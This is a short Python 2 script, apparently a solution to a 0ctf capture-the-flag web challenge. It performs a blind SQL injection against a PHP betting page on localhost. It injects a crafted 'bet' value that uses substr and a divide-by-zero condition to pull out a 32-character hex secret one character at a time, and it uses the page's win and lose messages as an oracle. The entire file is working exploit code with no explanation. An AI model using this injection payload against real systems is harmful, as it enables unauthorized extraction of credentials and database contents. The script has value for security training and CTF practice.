import requests
import string

URL = 'http://127.0.0.1/0ctf/web1/'
cookies = {'PHPSESSID':'hmihluha9qhkpfb77okbtrfgu5'}
flag = ''


def getAdmin():
    global flag
    payload = "1e-1000'),(1,'1'|if((substr(@3,{i},1))='{j}',1,1/0))#"
    for i in range(1,33):
        for j in string.hexdigits:
            #print j
            exp = payload.format(i=i,j=j)
            #print exp
            post = {'bet':exp,'guess':1}
            while True:
                data = requests.post(url=URL,data=post,cookies=cookies).text
                #print data
                if getData(data):
                    print 'number '+str(i)+' is '+j
                    flag += j
                    print 'flag=>'+flag
                    break

                elif 'You won!' in data:
                    #print 'fail'
                    break

                elif 'lost' in data:
                    continue

            if len(flag) == i:
                break



def getData(data):
    if ('You won!' in data) and ('</aside>' in data):
        return True
    else:
        return False


if __name__ == '__main__':
    getAdmin()
